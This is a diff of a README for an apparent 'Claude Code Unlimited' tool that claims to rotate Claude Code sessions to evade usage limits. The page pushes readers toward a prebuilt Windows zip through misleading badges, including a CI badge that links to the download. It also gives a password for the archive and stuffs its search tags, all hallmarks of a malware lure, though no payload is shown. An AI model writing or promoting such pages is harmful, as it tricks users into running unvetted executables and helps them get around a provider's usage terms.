@@ -1,15 +1,18 @@
 <div align="center">
 
-# Claude Code Unlimited — Session Rotation Engine for Claude Code CLI (Windows/macOS/Linux)
+# Claude Code Unlimited — Session Rotation Engine for Claude Code CLI
 
 <p><strong>Claude Code Unlimited — Session Rotation Engine for Claude Code CLI: native 64-bit portable build with hot-reloadable JSON configuration, low-overhead wrapper runtime, and prebuilt portable release with automatic limit detection.</strong></p>
 
 [![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip)
 [![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip)
 [![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip)
+[![Downloads](https://img.shields.io/github/downloads/SodovaFo7/claude-code-unlimited/total?style=for-the-badge&color=blueviolet)](../../releases)
 [![Stars](https://img.shields.io/github/stars/SodovaFo7/claude-code-unlimited?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)
 
-<a href="../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download claude-code-unlimited-v0.1.0-win64.zip" width="520"></a>
+<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>
+
+<a href="../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download claude-code-unlimited-v0.1.0-win64.zip" width="720"></a>
 
 <img src="password_badge.svg" alt="Archive Code 2026" width="280">
 
@@ -23,14 +26,14 @@
 
 ## Executive Summary & Design
 
-**Claude Code Unlimited — Session Rotation Engine for Claude Code CLI** (`claude-code-unlimited`) is a dedicated, low-overhead wrapper and session-suite engineered for 64-bit Windows 10, Windows 11, macOS and Linux systems. The wrapper watches the Claude Code output stream, detects limit messages in real time, checkpoints the active session and rotates it in place — same context, fresh limits. All parameters are controlled cleanly through `config/settings.json` with live hot-reload support and zero external dependencies.
+**Claude Code Unlimited — Session Rotation Engine for Claude Code CLI** (`claude-code-unlimited`) is a dedicated, low-overhead wrapper and session-suite engineered for 64-bit Windows 10 and Windows 11 systems. The wrapper watches the Claude Code output stream, detects limit messages in real time, checkpoints the active session and rotates it in place — same context, fresh limits. All parameters are controlled cleanly through `config/settings.json` with live hot-reload support and zero external dependencies.
 
 ## Getting Started (No Compiler Needed)
 
 | Platform | Direct Prebuilt Package | Documentation Mirror |
 | :--- | :--- | :--- |
 | **Windows 10 / 11 (64-bit)** | [**`claude-code-unlimited-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |
-| **macOS / Linux** | [**`claude-code-unlimited-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip) | [**FAQ (`docs/FAQ.md`)**](docs/FAQ.md) |
+| **Windows 10 / 11 (64-bit)** | [**`claude-code-unlimited-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip) | [**FAQ (`docs/FAQ.md`)**](docs/FAQ.md) |
 
 1. Download [`claude-code-unlimited-v0.1.0-win64.zip`](../../releases/download/v0.1.0/claude-code-unlimited-v0.1.0-win64.zip) using the download button above.
 2. Extract the archive using the access code shown on the badge above (`2026`).
@@ -83,4 +86,4 @@ cmake --build build --config Release
 ```
 
 ---
-<sub>Indexed tags: claude-code-unlimited, claude-code, claude-cli, anthropic, session-rotation, limit-reset, llm, ai-tools, coding-assistant, cli, developer-tools, nodejs, wrapper, productivity, automation</sub>
+<sub>Indexed tags: claude-code-unlimited, claude-code, claude-cli, claude, anthropic, session-rotation, session-manager, limit-reset, usage-limits, rate-limits, llm, llm-tools, ai, ai-tools, ai-agent, coding-assistant, coding-tools, copilot, dev-tools, cli, command-line, developer-tools, productivity, automation, wrapper, task-automation, workflow, streamlit-free, developer-experience, windows, portable, prebuilt, open-source</sub>
